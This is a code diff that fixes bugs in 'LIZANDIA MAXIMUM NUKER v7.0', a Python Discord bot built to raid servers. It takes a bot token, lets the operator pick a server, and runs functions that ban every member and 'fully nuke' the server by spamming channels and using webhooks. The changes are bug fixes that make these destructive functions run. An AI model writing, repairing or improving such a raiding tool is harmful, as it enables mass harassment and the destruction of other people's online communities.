@@ -22,7 +22,7 @@ print("""
 ║     ╚══════╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝╚═╝  ╚═╝                         ║
 ║                                                                                       ║
 ║                    ╔═══════════════════════════════════════════════════════════════╗  ║
-║                    ║              LIZANDIA MAXIMUM NUKER v6.0                      ║  ║
+║                    ║              LIZANDIA MAXIMUM NUKER v7.0                      ║  ║
 ║                    ║         CONSOLE SELECTION - TYPE 'y' TO BAN ALL              ║  ║
 ║                    ╚═══════════════════════════════════════════════════════════════╝  ║
 ║                                                                                       ║
@@ -35,7 +35,7 @@ print("""
 TOKEN = input("[?] ENTER BOT TOKEN: ")
 
 intents = discord.Intents.all()
-bot = commands.Bot(command_prefix="", intents=intents)
+bot = commands.Bot(command_prefix="!", intents=intents)
 
 # ============================================
 # COLORS
@@ -91,12 +91,12 @@ CHANNEL_NAMES = ["LIZANDIA", "LIZANDIA-TEAM", "LIZANDIA-POWER", "LIZANDIA-HERE"]
 # ============================================
 # BAN ALL MEMBERS FUNCTION
 # ============================================
-async def ban_all_members(guild, channel):
+async def ban_all_members(guild, channel=None):
     """Ban all members with LIZANDIA message"""
     
     print(f"\n{Colors.BOLD}{Colors.RED}[!] BANNING ALL MEMBERS IN: {guild.name}{Colors.RESET}")
     
-    # Get all members (fixed the flatten issue)
+    # Get all members correctly
     members = []
     async for member in guild.fetch_members(limit=None):
         members.append(member)
@@ -171,7 +171,7 @@ async def full_nuke(guild, channel):
     
     webhooks = []
     text_channels = []
-    async for ch in guild.text_channels:
+    for ch in guild.text_channels:
         text_channels.append(ch)
         if len(text_channels) >= 10:
             break
@@ -259,7 +259,7 @@ def show_servers():
     print(f"{Colors.BOLD}{Colors.YELLOW}{' ' * 20}📋 AVAILABLE SERVERS{Colors.RESET}")
     print(f"{Colors.BOLD}{Colors.CYAN}{'═'*60}{Colors.RESET}\n")
     
-    guilds = bot.guilds
+    guilds = list(bot.guilds)
     for i, guild in enumerate(guilds, 1):
         members = len(guild.members)
         print(f"{Colors.GREEN}[{i}]{Colors.RESET} {Colors.WHITE}{guild.name}{Colors.RESET}")
@@ -292,7 +292,8 @@ async def main_menu():
         try:
             server_num = int(choice)
             if 1 <= server_num <= len(bot.guilds):
-                return bot.guilds[server_num - 1], None
+                guilds_list = list(bot.guilds)
+                return guilds_list[server_num - 1], None
             else:
                 print(f"{Colors.RED}❌ INVALID NUMBER!{Colors.RESET}")
                 return None, None
@@ -338,7 +339,7 @@ async def on_ready():
         if confirm.upper() == 'LIZANDIA':
             # Get first channel to send updates
             first_channel = None
-            async for ch in target.text_channels:
+            for ch in target.text_channels:
                 first_channel = ch
                 break
             
